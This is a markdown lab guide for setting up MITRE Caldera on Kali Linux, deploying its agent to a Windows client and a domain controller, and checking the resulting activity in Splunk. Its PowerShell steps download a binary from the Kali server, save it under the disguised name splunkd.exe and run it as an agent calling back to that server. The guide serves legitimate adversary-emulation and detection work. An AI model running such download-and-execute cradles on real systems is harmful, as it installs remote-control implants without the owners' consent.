# Install & Deploy Caldera (Server on Kali, Agents on Windows)

## 1. Set Up Caldera Server on Kali Linux

### Install Dependencies
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install git python3 python3-pip -y
```

### Clone Caldera Repository
```bash
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
```

### Install Python Requirements
```bash
pip3 install -r requirements.txt
```

### Start Caldera Server
```bash
python3 server.py --insecure
```

> By default, Caldera runs on **http://0.0.0.0:8888**
> Default credentials:
> - **red** / **admin**
> - **blue** / **admin**

---

## 2. Verify Caldera is Accessible
- On Kali, open browser and go to:
```
http://localhost:8888
```
- From Windows machines, confirm you can reach:
```
http://<Kali-IP>:8888
```
> ✔ If unreachable, check pfSense firewall rules allow traffic on port **8888**

---

## 3. Deploy Caldera Agent on Windows Client

Open **PowerShell as Administrator** and run:
```powershell
$url = "http://<Kali-IP>:8888/file/download"
$wc = New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go-windows")
$data = $wc.DownloadData($url)
Get-Process | ? {$_.Path -like "C:\Users\Public\splunkd.exe"} | Stop-Process
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server http://<Kali-IP>:8888 -group windows-client" -NoNewWindow
```

> Replace `<Kali-IP>` with your actual Kali Linux IP address

---

## 4. Deploy Caldera Agent on Domain Controller

Open **PowerShell as Administrator** on the DC and run:
```powershell
$url = "http://<Kali-IP>:8888/file/download"
$wc = New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go-windows")
$data = $wc.DownloadData($url)
Get-Process | ? {$_.Path -like "C:\Users\Public\splunkd.exe"} | Stop-Process
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server http://<Kali-IP>:8888 -group domain-controller" -NoNewWindow
```

> The `-group` flag differentiates the DC agent from the Windows client agent

---

## 5. Verify Agents are Connected
- Go to Caldera Web UI → **Agents**
- You should see two agents:
  - `windows-client`
  - `domain-controller`

> ✔ Both should show status **Alive**

---

## 6. Run Your First Adversary Emulation
- Go to **Campaigns → Operations**
- Click **New Operation**
- Select:
  - **Adversary Profile** → e.g. `Discovery` or `ATT&CK Evaluation`
  - **Agent Group** → `windows-client` or `domain-controller`
- Click **Start**

---

## 7. Monitor in Splunk
After running operations, verify telemetry in Splunk:

```spl
index=sysmon EventCode=1
```
```spl
index=wineventlog EventCode=4624
```
```spl
index=suricata alert
```

> You should see Caldera-generated activity such as:
> - Process creation from the agent
> - Lateral movement attempts
> - Credential access TTPs
> - Network alerts triggered in Suricata
